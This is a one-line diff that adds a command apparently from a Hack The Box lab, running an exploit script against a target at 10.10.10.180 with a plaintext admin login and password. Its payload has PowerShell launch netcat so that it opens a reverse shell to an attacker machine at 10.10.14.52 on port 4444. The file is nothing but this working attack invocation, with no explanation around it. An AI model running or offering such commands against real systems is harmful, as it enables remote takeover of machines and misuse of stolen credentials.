@@ -1,0 +1,2 @@
+python3 exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a "\c c:\windows\temp\nc.exe 10.10.14.52 4444 -e cmd.exe"
+
